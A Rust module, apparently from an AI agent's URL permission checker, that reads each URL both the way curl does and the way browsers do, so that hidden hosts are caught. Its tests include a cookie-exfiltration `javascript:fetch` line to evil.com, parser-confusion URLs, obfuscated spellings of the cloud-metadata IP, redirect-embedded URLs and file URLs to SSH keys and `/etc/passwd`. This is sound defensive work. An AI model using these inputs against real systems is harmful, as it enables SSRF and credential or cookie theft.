//! A URL as a browser reads it, for the URLs a tool opens (ADR-047).
//!
//! [`super::of_url`] reads a URL the way `curl` does: the authority ends at the
//! first `/`, `?` or `#`, and the user part at its last `@`. A browser, and a
//! fetch tool built on the same URL parser (the WHATWG URL Standard), reads
//! some URLs differently: it drops tabs and newlines anywhere and control
//! characters at either end, takes `\` as `/` and any number of slashes after
//! `http:`, and percent-decodes the host. `https://evil.com\@github.com` is
//! `github.com` to the first reading and `evil.com` to the second. A rule must
//! see every host a client may reach, so a URL is judged by both readings
//! ([`readings`]); the strictest verdict across them wins as for any atoms.

/// Schemes whose URL names no network address: it runs code in a page
/// (`javascript:`), carries the page itself (`data:`, `blob:`), or shows the
/// browser's own state, settings or extensions. Opening one is never a fetch.
const LOCAL_SCHEMES: &[&str] = &[
    "javascript",
    "data",
    "blob",
    "filesystem",
    "view-source",
    "about",
    "chrome",
    "chrome-extension",
    "chrome-untrusted",
    "chrome-search",
    "devtools",
    "edge",
    "brave",
    "opera",
    "vivaldi",
    "moz-extension",
    "resource",
    "intent",
];

/// Schemes the URL Standard calls special: their authority also ends at `\`
/// and any run of `/` and `\` after the scheme comes before it.
const SPECIAL_SCHEMES: &[&str] = &["http", "https", "ws", "wss", "ftp"];

/// Most rounds of percent-decoding applied to find a URL inside a URL
/// (`%253A` is `%3A` after one round and `:` after two).
const DECODE_ROUNDS: usize = 3;

/// What a URL a tool opens or names points at.
#[derive(Debug, PartialEq, Eq)]
pub(crate) enum Target {
    /// Every host a client may read the URL as reaching ([`readings`]).
    Hosts(Vec<String>),
    /// A `file:` URL: the local path it reads, if absolute, and the host of
    /// `file://host/share/…`, which Windows reaches over the network (SMB).
    File {
        path: Option<String>,
        host: Option<String>,
    },
    /// `about:blank` or `about:srcdoc`: an empty page; nothing is read or sent.
    Blank,
    /// A scheme from [`LOCAL_SCHEMES`]: no network address.
    Local(String),
    /// No host can be read from it.
    Unreadable,
}

/// `url` as the URL Standard's parser sees it before anything else: ASCII tab
/// and newline removed anywhere, and C0 controls and spaces trimmed off both ends.
fn preprocessed(url: &str) -> String {
    url.trim_matches(|c: char| c <= ' ')
        .chars()
        .filter(|c| !matches!(c, '\t' | '\n' | '\r'))
        .collect()
}

/// The scheme of `url` in lowercase (`HTTPS:` → `https`), if it has one.
fn scheme(url: &str) -> Option<String> {
    let (scheme, _) = url.split_once(':')?;
    let mut chars = scheme.chars();
    let valid = chars.next().is_some_and(|c| c.is_ascii_alphabetic())
        && chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'));
    valid.then(|| scheme.to_ascii_lowercase())
}

/// `url` as a browser tool opens it: one without a scheme a browser knows
/// (`docs.rs/serde`, `localhost:3000`) gets `https://`, as Claude in Chrome's
/// `navigate` and the address bar do.
pub(crate) fn with_scheme(url: &str) -> String {
    let url = preprocessed(url);
    let known = scheme(&url).is_some_and(|s| {
        ["http", "https", "file"].contains(&s.as_str())
            || SPECIAL_SCHEMES.contains(&s.as_str())
            || LOCAL_SCHEMES.contains(&s.as_str())
    });
    if known { url } else { format!("https://{url}") }
}

/// What `url` points at ([`Target`]).
pub(crate) fn target(url: &str) -> Target {
    let url = preprocessed(url);
    match scheme(&url).as_deref() {
        Some("file") => {
            return Target::File {
                path: super::file_url_path(&url),
                host: file_host(&url),
            };
        }
        Some("about") if is_blank(&url) => return Target::Blank,
        Some(s) if LOCAL_SCHEMES.contains(&s) => return Target::Local(s.to_owned()),
        _ => {}
    }
    let hosts = readings(&url);
    if hosts.is_empty() {
        Target::Unreadable
    } else {
        Target::Hosts(hosts)
    }
}

/// `about:blank` or `about:srcdoc`, with or without a query or fragment.
fn is_blank(url: &str) -> bool {
    let rest = url.get(6..).unwrap_or_default();
    let page = rest.split(['?', '#']).next().unwrap_or_default();
    page.eq_ignore_ascii_case("blank") || page.eq_ignore_ascii_case("srcdoc")
}

/// The host of `file://host/…`, unless it is empty or `localhost`.
fn file_host(url: &str) -> Option<String> {
    let rest = url.get(5..)?;
    let authority = rest
        .strip_prefix("//")
        .or_else(|| rest.strip_prefix("\\\\"))?;
    let host = authority.split(['/', '\\', '?', '#']).next()?;
    let host = host.to_ascii_lowercase();
    (!host.is_empty() && host != "localhost").then_some(host)
}

/// Every host `url` may reach: [`super::of_url`]'s reading, the URL
/// Standard's reading of a special scheme ([`whatwg_host`]), and each of them
/// percent-decoded (`%31%36%39.254.169.254` is `169.254.169.254` to a browser).
/// Empty when no reading finds a host.
pub(crate) fn readings(url: &str) -> Vec<String> {
    let url = preprocessed(url);
    let mut hosts: Vec<String> = Vec::new();
    for host in super::of_url(&url).into_iter().chain(whatwg_host(&url)) {
        let decoded = decoded_host(&host);
        for h in std::iter::once(host).chain(decoded) {
            if !hosts.contains(&h) {
                hosts.push(h);
            }
        }
    }
    hosts
}

/// The host of a special-scheme URL as the URL Standard reads it: any run of
/// `/` and `\` after `scheme:`, then up to the first `/`, `\`, `?` or `#`,
/// after the last `@`. `None` for other schemes and when no host is found.
fn whatwg_host(url: &str) -> Option<String> {
    let scheme = scheme(url)?;
    if !SPECIAL_SCHEMES.contains(&scheme.as_str()) {
        return None;
    }
    let rest = url[scheme.len() + 1..].trim_start_matches(['/', '\\']);
    let authority = rest.split(['/', '\\', '?', '#']).next()?;
    super::authority_host(authority)
}

/// `host` percent-decoded, when it has an escape and decodes to a valid ASCII
/// host other than itself. An IPv6 zone (`fe80::1%25en0`) is left as it is.
fn decoded_host(host: &str) -> Option<String> {
    if !host.contains('%') || host.contains(':') {
        return None;
    }
    let decoded = super::percent_decode(host);
    super::authority_host(&decoded).filter(|d| d != host)
}

/// The host of `url` when it is a plain web page a read-only open may name
/// (ADR-047): `http` or `https`, no user part in either reading (a user and
/// password are data sent with the request), and every host a domain name
/// ([`super::fetchable`]): an IP address in any spelling, a single-label name
/// (`localhost`, `intranet`) and an unreadable host stay `net`.
pub(crate) fn page(url: &str) -> Option<Vec<String>> {
    let url = preprocessed(url);
    if !matches!(scheme(&url).as_deref(), Some("http" | "https")) {
        return None;
    }
    let after = &url[url.find(':')? + 1..];
    let standard = after.trim_start_matches(['/', '\\']);
    let ours = after.strip_prefix("//").unwrap_or(after);
    let user_part = |authority: &str, ends: &[char]| {
        authority
            .split(ends)
            .next()
            .is_some_and(|a| a.contains('@'))
    };
    if user_part(standard, &['/', '\\', '?', '#']) || user_part(ours, &['/', '?', '#']) {
        return None;
    }
    let hosts = readings(&url);
    (!hosts.is_empty() && hosts.iter().all(|h| super::fetchable(h))).then_some(hosts)
}

/// The hosts of the web URLs `url` carries after its host (a redirect target
/// such as `?next=https://…` or `/url?q=http%3A%2F%2F…`), percent-decoded up to
/// [`DECODE_ROUNDS`] times. A browser follows such a link when the page
/// redirects, so its host is judged as well.
pub(crate) fn embedded_hosts(url: &str) -> Vec<String> {
    let url = preprocessed(url);
    let start = url.find("://").map_or(0, |at| at + 3);
    let mut text = url[start..].to_owned();
    let mut hosts: Vec<String> = Vec::new();
    for _ in 0..DECODE_ROUNDS {
        let lower = text.to_ascii_lowercase();
        for (at, _) in lower.match_indices("http") {
            let candidate = &text[at..];
            if !matches!(scheme(candidate).as_deref(), Some("http" | "https")) {
                continue;
            }
            for host in readings(candidate) {
                if !hosts.contains(&host) {
                    hosts.push(host);
                }
            }
        }
        let decoded = super::percent_decode(&text);
        if decoded == text {
            break;
        }
        text = decoded;
    }
    hosts
}

#[cfg(test)]
mod tests {
    use super::{Target, embedded_hosts, page, readings, target, with_scheme};

    #[test]
    fn a_url_without_a_known_scheme_is_opened_over_https() {
        assert_eq!(with_scheme("docs.rs/serde"), "https://docs.rs/serde");
        assert_eq!(with_scheme("localhost:3000"), "https://localhost:3000");
        assert_eq!(with_scheme("HTTP://docs.rs"), "HTTP://docs.rs");
        assert_eq!(with_scheme("javascript:alert(1)"), "javascript:alert(1)");
        assert_eq!(with_scheme("file:///etc/passwd"), "file:///etc/passwd");
    }

    fn hosts(list: &[&str]) -> Vec<String> {
        list.iter().map(|h| (*h).to_owned()).collect()
    }

    #[test]
    fn every_reading_of_an_odd_url_is_a_host() {
        for (url, want) in [
            ("https://docs.rs/serde", &["docs.rs"][..]),
            // `\` ends the authority for a browser; `curl` reads to the `@`
            (
                "https://evil.com\\@github.com/",
                &["github.com", "evil.com"],
            ),
            (
                "https://github.com\\@evil.com/",
                &["evil.com", "github.com"],
            ),
            // any slashes after a special scheme
            ("http:/169.254.169.254/", &["http", "169.254.169.254"]),
            ("http:\\\\169.254.169.254\\", &["http", "169.254.169.254"]),
            ("https:evil.com", &["https", "evil.com"]),
            // tabs and newlines are dropped, control characters trimmed
            ("https://169.254.\t169.254/", &["169.254.169.254"]),
            ("\u{1}https://evil.com/ ", &["evil.com"]),
            ("https://git\nhub.com/", &["github.com"]),
            // percent-decoded hosts
            (
                "http://%31%36%39.254.169.254/",
                &["%31%36%39.254.169.254", "169.254.169.254"],
            ),
            ("http://[fe80::1%25en0]/", &["fe80::1%25en0"]),
        ] {
            assert_eq!(readings(url), hosts(want), "{url}");
        }
        assert!(readings("https://gíthub.com/").is_empty(), "no ASCII host");
    }

    #[test]
    fn schemes_that_name_no_network_address_are_told_apart() {
        assert_eq!(target("about:blank"), Target::Blank);
        assert_eq!(target("ABOUT:srcdoc#x"), Target::Blank);
        for (url, scheme) in [
            (
                "javascript:fetch('//evil.com/'+document.cookie)",
                "javascript",
            ),
            ("java\tscript://x%0Aalert(1)", "javascript"),
            (" JavaScript:alert(1)", "javascript"),
            ("data:text/html,<script>x</script>", "data"),
            ("about:config", "about"),
            ("chrome://settings/passwords", "chrome"),
            ("view-source:https://docs.rs/", "view-source"),
            ("blob:https://docs.rs/1f0c", "blob"),
        ] {
            assert_eq!(target(url), Target::Local(scheme.to_owned()), "{url}");
        }
        assert_eq!(
            target("file:///Users/me/.ssh/id_rsa"),
            Target::File {
                path: Some("/Users/me/.ssh/id_rsa".to_owned()),
                host: None
            }
        );
        assert_eq!(
            target("file://evil.com/share/x"),
            Target::File {
                path: Some("/share/x".to_owned()),
                host: Some("evil.com".to_owned())
            }
        );
        assert_eq!(
            target("file://localhost/p/a"),
            Target::File {
                path: Some("/p/a".to_owned()),
                host: None
            }
        );
        assert_eq!(target("intranet:8080"), Target::Hosts(hosts(&["intranet"])));
        assert_eq!(target("https://"), Target::Unreadable);
    }

    #[test]
    fn a_page_is_a_plain_web_address_on_a_domain_name() {
        assert_eq!(
            page("https://docs.rust-lang.org/std/"),
            Some(hosts(&["docs.rust-lang.org"]))
        );
        assert_eq!(
            page("HTTP://GitHub.com:443/x?y#z"),
            Some(hosts(&["github.com"]))
        );
        for url in [
            "https://github.com@evil.com/",
            "https://user:pw@docs.rs/",
            "https://docs.rs\\@evil.com/",
            "http://localhost:3000/",
            "http://127.0.0.1:8080/",
            "http://[::1]/",
            "http://2852039166/",
            "http://0xa9fea9fe/",
            "http://0251.0376.0251.0376/",
            "http://169.254.169.254/",
            "http://intranet/",
            "ftp://docs.rs/",
            "ws://docs.rs/",
            "file:///etc/passwd",
            "https://gíthub.com/",
            "http:/169.254.169.254/",
        ] {
            assert_eq!(page(url), None, "{url}");
        }
    }

    #[test]
    fn urls_inside_a_url_are_found_through_encodings() {
        assert_eq!(
            embedded_hosts("https://www.google.com/url?q=http://169.254.169.254/latest"),
            hosts(&["169.254.169.254"])
        );
        assert_eq!(
            embedded_hosts("https://a.test/r?next=https%3A%2F%2Fevil.com%2Fx"),
            hosts(&["evil.com"])
        );
        assert_eq!(
            embedded_hosts("https://a.test/r?u=http%253A%252F%252F10.0.0.1%252F"),
            hosts(&["10.0.0.1"])
        );
        assert!(embedded_hosts("https://docs.rs/http/latest/http/").is_empty());
        assert!(embedded_hosts("https://docs.rs/serde?q=https").is_empty());
    }
}
